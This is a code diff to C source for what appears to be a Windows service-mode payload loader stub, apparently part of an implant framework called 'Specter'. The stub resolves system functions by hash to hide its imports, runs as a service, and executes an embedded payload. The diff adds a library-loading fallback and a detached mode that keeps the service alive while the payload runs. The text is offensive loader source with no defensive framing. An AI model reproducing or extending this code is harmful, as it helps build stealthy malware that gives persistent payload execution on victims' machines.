@@ -169,6 +169,8 @@ static void __attribute__((ms_abi)) SvcMain(DWORD argc, PWCHAR *argv) {
     /* Resolve advapi32 functions */
     PVOID advapi32 = stub_find_module(HASH_ADVAPI32_DLL);
     if (!advapi32)
+        advapi32 = stub_load_library("advapi32.dll");
+    if (!advapi32)
         return;
 
     fn_RegisterServiceCtrlHandlerExW pRegister =
@@ -210,7 +212,15 @@ static void __attribute__((ms_abi)) SvcMain(DWORD argc, PWCHAR *argv) {
 
     /* Execute payload */
     g_svc_stop_requested = FALSE;
+#ifdef SPECTER_STUB_DETACHED_HOLD
+    if (stub_start_payload_detached()) {
+        fn_Sleep pSleep = (fn_Sleep)stub_resolve_kernel32_export(HASH_SLEEP);
+        while (!g_svc_stop_requested && pSleep)
+            pSleep(1000);
+    }
+#else
     stub_execute_payload();
+#endif
 
     /* Report SERVICE_STOPPED */
     g_svc_status.dwCurrentState     = SERVICE_STOPPED;
@@ -233,16 +243,26 @@ __attribute__((ms_abi))
 void ServiceEntry(void) {
     /* Resolve advapi32!StartServiceCtrlDispatcherW */
     PVOID advapi32 = stub_find_module(HASH_ADVAPI32_DLL);
+    if (!advapi32)
+        advapi32 = stub_load_library("advapi32.dll");
     if (!advapi32) {
         /* No advapi32 loaded -- direct execution fallback */
+#ifdef SPECTER_STUB_DETACHED_HOLD
+        stub_execute_payload_detached_pivot_hold(INFINITE);
+#else
         stub_execute_payload();
+#endif
         return;
     }
 
     fn_StartServiceCtrlDispatcherW pDispatcher =
         (fn_StartServiceCtrlDispatcherW)stub_find_export(advapi32, HASH_STARTSERVICECTRLDISPATCHERW);
     if (!pDispatcher) {
+#ifdef SPECTER_STUB_DETACHED_HOLD
+        stub_execute_payload_detached_pivot_hold(INFINITE);
+#else
         stub_execute_payload();
+#endif
         return;
     }
 
@@ -265,6 +285,10 @@ void ServiceEntry(void) {
        service is stopped. If it fails (not launched by SCM), fall
        back to direct execution. */
     if (!pDispatcher((PVOID)dispatch_table)) {
+#ifdef SPECTER_STUB_DETACHED_HOLD
+        stub_execute_payload_detached_pivot_hold(INFINITE);
+#else
         stub_execute_payload();
+#endif
     }
 }
